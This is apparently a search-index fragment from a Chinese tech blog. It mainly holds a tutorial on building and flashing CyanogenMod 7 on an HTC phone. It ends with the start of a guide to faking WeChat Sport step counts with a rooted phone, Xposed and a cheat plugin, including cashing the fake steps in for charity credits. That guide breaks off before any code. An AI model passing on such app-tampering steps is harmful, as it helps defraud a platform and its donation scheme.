\u6b21\u6821\u9a8c\uff0c\u4f46\u96be\u514d\u4f1a\u6709\u758f\u6f0f\u4e4b\u5904\uff0c\u656c\u8bf7\u6307\u6b63\uff0c\u7b14\u8005\u5c06\u5728\u7b2c\u4e00\u65f6\u95f4\u7ed9\u4e88\u7b54\u590d\u6307\u6b63\u3002 \u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\uff1ahttp://blog.csdn.net/andie_guo/article/details/16879443 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/andie_guo/article/details/16879443","title":"\u3010Android ROM\u5b9a\u5236\u3011CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#android-romcyanogenmod","text":"","title":"\u3010Android ROM\u5b9a\u5236\u3011CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_1","text":"CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1\u662f\u4e00\u4e2a\u8017\u65f6\u3001\u8017\u7cbe\u529b\u3001\u8017\u4eba\u54c1\u7684\u5de5\u7a0b\uff0c\u5982\u679c\u4f60\u6709\u8db3\u591f\u7684\u6bc5\u529b\u3001\u8010\u5fc3\uff0c\u4ee5\u53ca\u505a\u597d\u4e86\u627f\u53d7\u5404\u79cd\u4e0b\u8f7d\u51fa\u9519\u3001\u7f16\u8bd1\u51fa\u9519\u3001\u56fa\u5316\u51fa\u9519\u6253\u51fb\u7684\u5fc3\u7406\u51c6\u5907\uff0c\u8bf7\u4e00\u6b65\u4e00\u6b65\u5f80\u4e0b\u770b\u3002\u8003\u8651\u5230Cyanogenmod\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u6709\u9650\uff0c\u4ee5\u53ca\u5e7f\u5927Android\u7f16\u7a0b\u7231\u597d\u8005\u7684\u624b\u673a\u8bbe\u5907\u5dee\u5f02\uff0c\u672cblog\u662f\u4ee5\u624b\u673aHTC Aria(liberty) \u4e0b\u8f7d\u3001\u7f16\u8bd1Cyanogenmod 7 \u3001\u5e76\u751f\u6210\u56fa\u4ef6\u70e7\u5199\u5230\u624b\u673a\u4e3a\u4f8b\uff0c\u5f15\u5bfc\u8bfb\u8005\u6839\u636e\u81ea\u5df1\u7684\u624b\u673a\u8bbe\u5907\u9009\u62e9\u5176\u652f\u6301\u7684Cyanogenmod\u7248\u672c\u4ee5\u53ca\u5176\u6e90\u7801\u5206\u652f\u8fdb\u884cCyanogenmod\u6e90\u7801\u7684\u4e0b\u8f7d\u3001\u7f16\u8bd1\u3001\u56fa\u5316\u3002 Ps.\u7b14\u8005\u67e5\u770b\u5404\u79cd\u8d44\u6599\uff0c\u4eceCyanogenmod\u662f\u4ec0\u4e48\u90fd\u4e0d\u77e5\u9053\u5230\u6700\u7ec8\u6210\u529f\u4e0b\u8f7dCyanogenmod\u6e90\u7801\u3001\u7f16\u8bd1\u3001\u751f\u6210\u56fa\u4ef6\u3001\u5728\u624b\u673a\u4e0a\u8fd0\u884cCM7\u7cfb\u7edf\u5171\u6298\u817e\u4e861\u4e2a\u661f\u671f\u3002\u5176\u4e2d\u4e0b\u8f7d\u6e90\u7801\u8017\u65f63\u5929\uff0c\u6bcf\u5929\u665a\u4e0a\u534a\u591c\u722c\u8d77\u6765\u770b\u662f\u5426\u5168\u90e8\u4e0b\u8f7d\u5b8c\u6210\u3002\u7f16\u8bd13\u5929\uff0c\u5305\u62ec\u5904\u7406\u5404\u79cd\u7f16\u8bd1\u51fa\u9519\uff0c\u751f\u6210\u56fa\u4ef6\u5e76\u8fd0\u884c\u7cfb\u7edf\u5e76\u5229\u7528\u8be5\u7cfb\u7edf\u62e8\u6253\u7b2c\u4e00\u4e2a\u7535\u8bdd\u6210\u529f\u65f6\uff0c\u5174\u594b\u4e4b\u60c5\u65e0\u4ee5\u8a00\u8868\uff0c\u5386\u53f2\u7684\u4e00\u523b\uff0c\u5c31\u50cf\u4e2d\u56fd\u53d1\u9001\u7b2c\u4e00\u5c01\u56fd\u9645\u7535\u5b50\u90ae\u4ef6\u4e00\u6837\u5f00\u542f\u4e2d\u56fd\u4e92\u8054\u7f51\u65f6\u4ee3\uff0c\u5f00\u542f\u4e86\u81ea\u5df1\u7684Android\u7cfb\u7edf\u6df1\u5165\u5b66\u4e60\u4e4b\u8def\uff0c\u8fd9\u8fd8\u53ea\u662f\u5f00\u59cb\uff0c\u540e\u9762\u7684\u8def\u8fd8\u5f88\u957f\u3002","title":"\u524d\u8a00\uff1a"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#cyanogenmod","text":"1\u3001Cyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907 Cyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u7c7b\u578b\u6709Htc\u3001Samsung\u3001Huawei\u3001Sony\u7b49\u5176\u5404\u81ea\u65d7\u4e0b\u7684\u4e3b\u6d41\u578b\u53f7\uff0c\u8be6\u7ec6\u7684\u4fe1\u606f\u8bf7\u67e5\u9605Cyanogenmod\u5b98\u65b9\u7f51\u5740\uff1a http://wiki.cyanogenmod.org/w/Devices#vendor=; ,\u53ef\u4ee5\u67e5\u770bCyanogenmod\u5b98\u65b9\u652f\u6301\u7684\u624b\u673a\u8bbe\u5907\u3002 \u5728vendor\u6807\u7b7e\u4e2d\u9009\u4e2dHtc\uff0c\u53ef\u770b\u5230\u7b14\u8005\u7684\u624b\u673aHTC Aria(liberty),\u8868\u660e\u652f\u6301Cyanogenmod\u7f16\u8bd1\u751f\u6210\u7684\u56fa\u4ef6\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 2\u3001\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7 \u67e5\u770b\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7\u76f4\u63a5\u5173\u7cfb\u5230CM\u6e90\u7801\u5206\u652f\u7684\u9009\u62e9\uff0c\u6bd4\u5982\u7b14\u8005\u624b\u673a\u662fHTC liberty\uff0c\u5176\u652f\u6301\u7684CM\u7248\u672c\u53f7\u662fCM 7\uff0c\u5176\u5bf9\u5e94\u7684\u5206\u652f\u662fgingerbread\u3002 CM Support: 7 Latest CM version: gingerbread \u4e86\u89e3\u5b8c\u81ea\u5df1\u7684\u624b\u673a\u662f\u5426\u652f\u6301Cyanogenmod\u6e90\u7801\u7f16\u8bd1\u751f\u6210\u7684\u56fa\u4ef6\u548c\u5176\u652f\u6301\u7684CM version\u3002\u63a5\u4e0b\u6765\u5c31\u5f00\u59cb\u642d\u5efa\u73af\u5883\u3001\u4e0b\u8f7d\u3001\u7f16\u8bd1CM\u6e90\u7801\u4e86\u3002","title":"\u4e00\u3001Cyanogenmod"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_2","text":"1\u3001 ubuntu\u7cfb\u7edf\u5b89\u88c5 \u7b14\u8005\u7f16\u8bd1\u7684\u662fCyanogenMod 7\u7a33\u5b9a\u7248\u3001Android\u6e90\u78012.3\u7cfb\u5217\uff0c\u800cAndroid 2.3\u7cfb\u7edf\u9650\u5236\u5fc5\u987b\u4f7f\u752832\u4f4d\uff08Android4\u652f\u630164\u4f4d\u7cfb\u7edf\uff09\uff0c\u6545\u4f7f\u7528ubuntu10.3 32\u4f4d\u7cfb\u7edf\u3002\u8be6\u7ec6\u5b89\u88c5\u6b65\u9aa4\u8bf7\u53c2\u8003\u7f51\u4e0a\u7684\u5b89\u88c5\u6559\u7a0b\uff0c\u5df2\u5b89\u88c5ubuntu 32\u4f4d\u7cfb\u7edf\u8bf7\u8df3\u8fc7\u3002 2\u3001 \u5b89\u88c5JDK6 $ sudo add-apt-repository \"deb http://archive.canonical.com/ lucid partner\" $ sudo apt-get update $ sudo apt-get installsun-java6-jdk 3\u3001 \u5b89\u88c5\u7f16\u8bd1\u6240\u9700\u8981\u7684\u5305 (Ubuntu 10.04-- 11.10) $ sudo apt-get installgit-core gnupg flex bison gperf build-essential \\ zip curl zlib1g-dev libc6-devlib32ncurses5-dev ia32-libs \\ x11proto-core-dev libx11-devlib32readline5-dev lib32z-dev \\ libgl1-mesa-dev g++-multilib mingw32 tofrodospython-markdown \\ libxml2-utils xsltproc Ubuntu 12.04\u5b89\u88c5\u7f16\u8bd1\u6240\u9700\u8981\u7684\u5305\u8be6\u7ec6\u8bf7\u53c2\u8003\uff1a http://source.android.com/source/initializing.html 4\u3001 \u914d\u7f6eUSB\u8bbf\u95ee\u6743\u9650 (1)\u3001\u9ed8\u8ba4\u5c06htc\u7c7b\u578b\u624b\u673a\u901a\u8fc7usb\u8fde\u63a5\u4e0a\u7535\u8111\u4e4b\u540e\uff0c\u4f7f\u7528adb devices\u662f\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u624b\u673a\u8bbe\u5907\u7684\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a tip\uff1a\u8fd9\u91cc\u8981\u4f7f\u7528\u5230adb\u5de5\u5177\uff0c\u5982\u679cubuntu\u7cfb\u7edf\u5b89\u88c5\u4e86android eclipse\u5f00\u53d1\u5de5\u5177\uff0c\u9ed8\u8ba4\u662f\u81ea\u5e26adb\u5de5\u5177\u7684\u3002 (2)\u3001\u5c06\u8bbe\u5907\u8fde\u63a5\u4e0a\u7535\u8111\uff0c\u67e5\u770b\u624b\u673a\u7684usb\u8bbe\u5907\uff1a ubuntu@andy-laptop:~$lsusb htc \u624b\u673a\u5bf9\u5e94\u7684usb\u8bbe\u5907\u4fe1\u606f\u5982\u4e0b\uff1a Bus 002 Device 004: ID 0bb4:0c92 High Tech Computer Corp. \u5982\u4e0b\u56fe\u6240\u793a\uff1a (3)\u3001\u4fee\u653951-android.rules\u6587\u4ef6\uff1a ubuntu@andy-laptop:sudo gedit /etc/udev/rules.d/51-android.rules \u6dfb\u52a0\u4e00\u884c\u4fe1\u606f\uff0c\u7279\u522b\u6ce8\u610f\uff0cATTR{idVendor} \u4e0eATTR{idProduct}\u7684\u503c\u5206\u522b\u4e8eID 0bb4:0c92\u5bf9\u5e94\u3002 # fastboot protocol onmanta (htc liberty) SUBSYSTEM==\"usb\",ATTR{idVendor}==\"0bb4\", ATTR{idProduct}==\"0c92\",MODE=\"0600\", OWNER=\"ubuntu\" \u5982\u4e0b\u56fe\u6240\u793a\uff1a (4)\u3001\u4fdd\u5b58\u6587\u4ef6\u540e\uff0c\u91cd\u65b0\u5c06\u624b\u673a\u8fde\u63a5\u5230\u7535\u8111\uff0c\u4f7f\u7528adb devices\u67e5\u770b\u8bbe\u5907\u7684\u8fde\u63a5\u72b6\u6001\uff0c\u53ef\u53d1\u73b0\u5df2\u7ecf\u62e5\u6709\u4e86\u8bbf\u95eeusb\u7684\u6743\u9650\u3002 (5)\u3001\u8be6\u7ec6\u8bf7\u53c2\u8003\uff1a http://source.android.com/source/initializing.html Configuring USB Access\u5c0f\u8282","title":"\u4e8c\u3001\u73af\u5883\u642d\u5efa"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_3","text":"1\u3001 \u5b89\u88c5Repo //\u4ece\u7528\u6237\u6839\u76ee\u5f55\u5f00\u59cb $ mkdir ~/bin $ PATH=~/bin:$PATH $ curl http://commondatastorage.googleapis.com/git-repo-downloads/repo > ~/bin/repo $ chmod a+x ~/bin/repo 2\u3001\u4e0b\u8f7d\u6e90\u7801 (1)\u3001 \u5982\u4f55\u9009\u62e9\u5206\u652f \u7b14\u8005\u7684\u624b\u673a\u662fhtc G9,\u652f\u6301\u7684CM verison :gingerbread\uff0c\u9009\u62e9\u624b\u673a\u8bbe\u5907\u6240\u652f\u6301\u5206\u652f\u7684\u8be6\u7ec6\u6b65\u9aa4\uff0c\u8bf7\u53c2\u8003\u672cblog 1.2\u3001\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7 \u7b14\u8005\u6700\u7ec8\u9009\u62e9\u7684\u5206\u652f\u662f\uff1agingerbread-release \u67e5\u770b https://github.com/CyanogenMod/android.git \u4e0b\u6240\u652f\u6301\u7684\u6240\u6709\u5206\u652f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u662f\u5206\u652fgingerbread-release\u3002 (2)\u3001\u4f7f\u7528repo\u6267\u884c\u4e0b\u8f7d //\u4ece\u7528\u6237\u6839\u76ee\u5f55\u4e0b\u5f00\u59cb,\u5206\u522b\u521b\u5efa\u6587\u4ef6\u5939CyanogenMod/android/CM-7 $cd ./CyanogenMod/android/CM-7 //\u83b7\u53d6gingerbread-release\u7684\u5206\u652f\u6e90\u4ee3\u7801 $repo init -u git://github.com/CyanogenMod/android.git -b gingerbread-release //\u540c\u6b65\u670d\u52a1\u5668\u4ee3\u7801\u5230\u672c\u5730\uff0c-j16\u636e\u7f51\u53cb\u53cd\u5e94\u662f\u591a\u5f00\u7f51\u7edc\u8fde\u63a5\uff0c\u4ece\u800c\u80fd\u63d0\u9ad8\u4e0b\u8f7d\u901f\u5ea6 $repo sync -j16 repo\u547d\u4ee4\u4f7f\u7528\u53c2\u8003\uff1a http://source.android.com/source/using-repo.html \u7279\u522b\u63d0\u9192\uff1a\u5173\u4e8egingerbread\u5206\u652f\uff0c\u6211\u4e0b\u8f7d\u4e4b\u540e\uff0c\u53d1\u73b0CyanogenMod/android/CM-7/device\u76ee\u5f55\u91cc\u6ca1\u6709htc\u3001\u4e09\u661f\u4e00\u7cfb\u5217\u624b\u673a\u5bf9\u5e94\u7684\u7248\u672c\uff0c\u6298\u817e\u4e86\u597d\u957f\u4e00\u6bb5\u65f6\u95f4\uff0c\u6700\u7ec8\u9009\u62e9gingerbread-release\u5206\u652f\u4e0b\u8f7d\u6e90\u7801\uff0c\u5728CyanogenMod/android/CM-7/device\u76ee\u5f55\u6210\u529f\u83b7\u5f97\u591a\u6b3e\u624b\u673a\u5bf9\u5e94\u7684\u7248\u672c\u3002 \u4e0b\u8f7d\u6210\u529f\u540e\uff0c\u5728CyanogenMod/android/CM-7/device\u6587\u4ef6\u5939\u4f1a\u5305\u542b\u5982\u4e0b\u6240\u793a\u6587\u4ef6\u5939\uff0c\u4ee5\u6b64\u5224\u65ad\u6e90\u7801\u662f\u5426\u4e0b\u8f7d\u5b8c\u6574\u3002\u53d1\u73b0device\u6587\u4ef6\u5939\u91cc\u5df2\u7ecf\u5305\u542b\u4e86htc\u6587\u4ef6\u5939\uff0c\u5982\u56fe\u6240\u793a\uff1a \u70b9\u51fbhtc\u6587\u4ef6\u5939\u8fdb\u5165\u53ef\u53d1\u73b0liberty\u5df2\u5b89\u9759\u7684\u8eba\u5728\u90a3\uff0c\u5982\u56fe\u6240\u793a\uff1a","title":"\u4e09\u3001\u4e0b\u8f7d\u6e90\u7801"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_4","text":"1\u3001 \u8bfb\u53d6\u624b\u673a\u4e0a\u7684\u4e00\u4e9b\u79c1\u6709\u914d\u7f6e\u6587\u4ef6 \u5c06htc\u624b\u673a\u8fde\u63a5\u4e0aubuntu\u7cfb\u7edf\uff0c\u53ef\u80fd\u6ca1\u6709usb\u8bbf\u95ee\u6743\u9650\uff0c\u5177\u4f53\u8bf7\u53c2\u80032.4 \u914d\u7f6eUSB\u8bbf\u95ee\u6743\u9650 $cd ~/CyanogenMod/android/CM-7/device/htc/liberty $./extract-files.sh 2\u3001 \u751f\u6210\u7f16\u8bd1\u811a\u672c\u6587\u4ef6 $cd ~/CyanogenMod/android/CM-7/vendor/cyanogen $./get-rommanager $./extract-google-files //\u590d\u5236\u7f16\u8bd1\u811a\u672c\u6587\u4ef6\u5230\u76ee\u5f55\u4e0b\uff0c\u540e\u9762\u7f16\u8bd1\u6574\u4e2a\u7cfb\u7edf\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\u6587\u4ef6 $cp ~/CyanogenMod/android/CM-7/vendor/cyanogen/products/cyanogen_lieberty.mk ~/CyanogenMod/android/CM-7/buildspec.mk \u6267\u884c./get-rommanager\u8fd0\u884c\u7ed3\u679c\u5982\u56fe\u6240\u793a\uff1a 3\u3001 \u7f16\u8bd1\u811a\u672c \u56de\u5230CyanogenMod/android/CM-7\u76ee\u5f55\u4e0b\uff0c\u6267\u884c\u811a\u672c\u3002 //\u521d\u59cb\u5316\u811a\u672c\uff0c\u8fd9\u4e2a\u662f\u540e\u9762\u7684\u91cd\u8981\u57fa\u7840\u6b65\u9aa4 $cd ~/CyanogenMod/android/CM-7 $source build/envsetup.sh //\u9009\u62e9\u7f16\u8bd1\u7684\u4ea7\u54c1\uff0c\u8fd9\u4e2a\u547d\u4ee4\u9700\u8981\u4e00\u5c0f\u4f1a\u513f\u65f6\u95f4\uff0c\u4f46\u662f\u53c8\u6ca1\u63d0\u793a\uff0c\u8010\u6027\u7b49\u5f85\u4e00\u4e0b //\u6216\u76f4\u63a5\u6267\u884clunch\u547d\u4ee4\uff0c\u67e5\u770blist\u9009\u9879\u6765\u9009\u62e9\u6267\u884c\u54ea\u4e2a\u7248\u672c $lunch cyanogen_liberty-eng //\u5f00\u59cb\u7f16\u8bd1 $make -j4 CYANOGEN_WITH_GOOGLE=true otapackage \u6267\u884clunch\u547d\u4ee4\uff0c\u9009\u62e9119\uff0c\u663e\u793a\u4fe1\u606f\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7f16\u8bd1\u6210\u529f\u663e\u793a\u5982\u4e0b\u4fe1\u606f\uff0c\u8fd9\u5f20\u56fe\u7247\u6765\u7684\u76f8\u5f53\u4e0d\u5bb9\u6613\uff0c\u534a\u591c\u8d77\u6765\u622a\u7684\u56fe: 4\u3001\u7f16\u8bd1\u53ef\u80fd\u4ea7\u51fa\u7684\u9519\u8bef\u5206\u6790\uff08\u5982\u679c\u6ca1\u6709\u95ee\u9898\u53ef\u76f4\u63a5\u8df3\u8fc7\uff0c\u6267\u884c\u7b2c5\u6b65\uff1a\u751f\u6210\u5237\u673azip\u5305\u64cd\u4f5c\uff09\uff1a \u9519\u8bef\u539f\u56e0\uff1a\u65e0\u6cd5\u8bbf\u95ee\u6587\u4ef6: corrupted zip file \u9519\u8bef\u539f\u56e0\u5206\u6790\uff1a\u6ca1\u6709\u9009\u62e9\u6b63\u786ejar\u7248\u672c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u9009\u62e9\u7684\u662f/usr/bin/fastjar\u81ea\u52a8\u6a21\u5f0f\uff0c\u901a\u8fc7sudo update-alternatives --config jar\u9009\u62e9jdk6\u5373\u53ef\u3002 \u95ee\u9898\u89e3\u51b3\uff1a 32\u4f4dubuntu\u7f16\u8bd1android2.3,\u65e0\u6cd5\u8bbf\u95ee java.lang.Object\u95ee\u9898 http://hi.baidu.com/cmdmac/item/93920ff30164270884d278a4 \u7f16\u8bd1android 2.3.4\u7684\u4e00\u4e2a\u9519\u8bef http://blog.163.com/covel_zhang/blog/static/81641365201223122541768/ 5\u3001\u751f\u4ea7\u5237\u673azip\u5305\u3002 \u5728CyanogenMod/android/CM-7\u76ee\u5f55\u4e0b\u6267\u884c\u5982\u4e0b\u811a\u672c\uff1a $./vendor/cyanogen/tools/squisher \u751f\u6210\u56fa\u4ef6\u5305\u6210\u529f\uff0c\u663e\u793a\u5982\u4e0b\u56fe\u6240\u793a\u4fe1\u606f\uff1a","title":"\u56db\u3001\u7f16\u8bd1\u6e90\u7801"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_5","text":"\u5c06cm-7-20131119-UNOFFCIAL-liberty.zip\u5305\u5237\u5230\u6211htc\u624b\u673a\u4e0a\u4e00\u5207\u6b63\u5e38\uff0c\u6709\u56fe\u6709\u771f\u76f8\uff0c\u7559\u5fc3\"\u5173\u4e8e\u624b\u673a\"\u4fee\u8ba2\u7248\u672c\u9009\u9879\uff0c\u6b63\u662f\u7b2c5\u6b65\u751f\u6210\u7684\u5237\u673a\u5305cm-7-20131119-UNOFFCIAL-liberty.zip\u3002","title":"\u4e94\u3001\u5237\u673a"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_6","text":"Android\u62d3\u5c55\u7cfb\u5217(5)--CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1(Android ROM\u5b9a\u5236\u57fa\u7840\u7bc7) Android \u7b2c\u4e09\u65b9ROM CyanogenMod \u6e90\u7801\u4e0b\u8f7d\uff0c\u7f16\u8bd1\uff0c\u5237\u673a http://source.android.com/source/initializing.html http://source.android.com/source/building.html","title":"\u516d\u3001\u53c2\u8003\uff1a"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_7","text":"\u672c\u6587\u4ee5\u7b14\u8005\u81ea\u8eab\u7684CyanogenMod\u6e90\u7801\u7f16\u8bd1\u6298\u817e\u7ecf\u5386\u63cf\u8ff0\u4e86\u5229\u7528\u7b2c\u4e09\u65b9\u5f00\u6e90\u7cfb\u7edf\u5b9a\u5236\u4e2a\u6027\u5316ROM\u7684\u8fc7\u7a0b\uff0c\u4e4b\u6240\u4ee5\u8981\u8bb0\u5f55\u8fd9\u7bc7\u535a\u6587\uff0c\u5b8c\u5168\u662f\u672c\u7740\u524d\u4eba\u683d\u6811\u540e\u4eba\u4e58\u51c9\u7684\u5b97\u65e8\uff0c\u8ba9\u9047\u5230\u540c\u6837\u9700\u6c42\u7684\u5f00\u53d1\u8005\u4e0d\u81f3\u4e8e\u50cf\u7b14\u8005\u5982\u6b64\u6298\u817e\uff0c\u6216\u8005\u8bf4\u6298\u817e\u7684\u5c11\u4e00\u4e9b\uff0c\u5982\u6b64\uff0c\u7b14\u8005\u5fc3\u6ee1\u610f\u8db3\u3002\u6700\u540e\uff0c\u672c\u535a\u6587\u867d\u7ecf\u7b14\u8005\u591a\u6b21\u6821\u9a8c\uff0c\u4f46\u96be\u514d\u4f1a\u6709\u758f\u6f0f\u4e4b\u5904\uff0c\u656c\u8bf7\u6307\u6b63\uff0c\u7b14\u8005\u5c06\u5728\u7b2c\u4e00\u65f6\u95f4\u7ed9\u4e88\u7b54\u590d\u6307\u6b63\u3002 \u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\uff1ahttp://blog.csdn.net/andie_guo/article/details/16879443 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/andie_guo/article/details/16879443","title":"\u4e03\u3001\u5c0f\u7ed3\uff1a"},{"location":"Android/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%BD%93%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E7%AC%AC%E4%B8%80%E5%90%8D%E2%80%93%E5%88%A9%E7%94%A8AndroidHook%E8%BF%9B%E8%A1%8C%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%BD%9C%E5%BC%8A/","text":"\u624b\u628a\u624b\u6559\u4f60\u5f53\u5fae\u4fe1\u8fd0\u52a8\u7b2c\u4e00\u540d \u2013 \u5229\u7528Android Hook\u8fdb\u884c\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a 0x00 \u5e8f \u968f\u7740\u5e26\u534f\u5904\u7406\u5668\u548c\u4e70\u624b\u73af\u7684\u4eba\u8d8a\u6765\u8d8a\u591a,\u5fae\u4fe1\u8fd0\u52a8\u4e00\u4e0b\u5b50\u706b\u4e86,\u53ea\u8981\u4f60\u5728\u5fae\u4fe1\u5173\u6ce8\u5fae\u4fe1\u8fd0\u52a8,\u624b\u673a\u5c31\u80fd\u81ea\u52a8\u8bb0\u5f55\u4f60\u6bcf\u5929\u884c\u8d70\u7684\u6b65\u6570,\u8fd8\u53ef\u4ee5\u8ddf\u670b\u53cb\u5708\u91cc\u7684\u597d\u53cbPK\u8fd0\u52a8\u91cf\u3002\u5e76\u4e14\u6bcf\u65e5\u6392\u540d\u7b2c\u4e00\u7684\u7528\u6237\u53ef\u4ee5\u5360\u636e\u5f53\u65e5\u6392\u884c\u699c\u7684\u5c01\u9762\u3002\u8fd9\u5145\u5206\u6fc0\u8d77\u4e86\u5927\u5bb6\u7684\u6c42\u80dc\u7684\u6b32\u671b,\u4e8e\u662f\u51fa\u73b0\u4e86\u5f88\u591a\u52b1\u5fd7\u7684\u548c\u60b2\u4f24\u7684\u6545\u4e8b\u2026\u2026 0x01\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u5927\u6cd5 \u5176\u5b9e\u60f3\u8981\u62ff\u7b2c\u4e00\u6ca1\u6709\u90a3\u4e48\u9ebb\u70e6,\u53ea\u8981\u4f1a\u4e00\u70b9Android\u7684Hook\u77e5\u8bc6,\u5c31\u53ef\u4ee5\u8f7b\u677e\u51b2\u5230\u6392\u884c\u699c\u7b2c\u4e00\u540d\u3002\u63a5\u4e0b\u6765\u6211\u5c31\u624b\u628a\u624b\u6559\u4f60\u5982\u4f55\u53d8\u6210\u7b2c\u4e00\u3002 \u9996\u5148\u6211\u4eec\u9700\u8981\u4e00\u53f0\u5e26\u534f\u5904\u7406\u7684root\u540e\u7684android\u673a\u5668,\u6bd4\u5982\u8bf4nexus 5\u3002\u7136\u540e\u6211\u4eec\u88c5\u4e0a\u4f5c\u5f0a\u7528\u7684XPosed Hook\u6846\u67b6\u548c\u4f5c\u5f0a\u63d2\u4ef6\u3002\u8fd9\u4e24\u4e2aapk\u53ef\u4ee5\u5728\u6211\u7684github\u4e0a\u4e0b\u8f7d\u5230\u3002 https://github.com/zhengmin1989/WechatSportCheat \u4e0b\u8f7d\u5b8c\u540e,\u5148\u5b89\u88c5XPosed.apk\u3002\u63a5\u7740\u6253\u5f00Xposed,\u9009\u62e9\u201c\u5b89\u88c5/\u66f4\u65b0\u201d,\u7136\u540e\u6839\u636e\u63d0\u793a\u91cd\u542f\u624b\u673a\u3002 \u91cd\u542f\u5b8c\u540e,\u518d\u5b89\u88c5xposedwechat.apk\u63d2\u4ef6\u3002\u7136\u540e\u6253\u5f00Xposed\u7684\u6a21\u5757\u754c\u9762,\u4f1a\u770b\u5230xposedwechat\u8fd9\u4e2a\u63d2\u4ef6\u3002\u6211\u4eec\u5728\u8fd9\u91cc\u5c06\u5b83\u9009\u4e2d,\u7136\u540e\u518d\u6839\u636e\u63d0\u793a\u91cd\u542f\u624b\u673a\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u89c1\u8bc1\u5947\u8ff9\u7684\u65f6\u523b\u2026\u4f60\u968f\u610f\u8d70\u4e24\u6b65,\u7136\u540e\u6253\u5f00\u5fae\u4fe1\u8fd0\u52a8,\u54a6,\u600e\u4e48\u5c31\u591a\u4e861000\u6b65?\u518d\u968f\u4fbf\u8d70\u51e0\u6b65,\u54a6,\u600e\u4e48\u53c8\u591a\u4e861000\u6b65?\u2026 demo\u89c6\u9891\u5982\u4e0b: \u4ec5\u4ec5\u5237\u6b65\u6570\u8fd8\u662f\u4e0d\u591f\u8fc7\u763e\u5427?\u5fae\u4fe1\u8fd0\u52a8\u8fd8\u63a8\u51fa\u4e86\u76ca\u884c\u5bb6\u6d3b\u52a8,\u53ef\u4ee5\u7528\u6bcf\u5929\u7684\u6b65\u6570\u6362\u53d6\u7231\u5fc3\u6350\u6b3e\u3002\u6709\u4e86\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u5927\u6cd5,\u6211\u4eec\u53ef\u4ee5\u6bcf\u5929\u5728\u5bb6\u968f\u4fbf\u8d70\u51e0\u6b65\u7136\u540e\u6362\u53d6\u7231\u5fc3\u6350\u6b3e(\u5982\u56fe\u6240\u793a)\u3002 0x02 \u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u539f\u7406 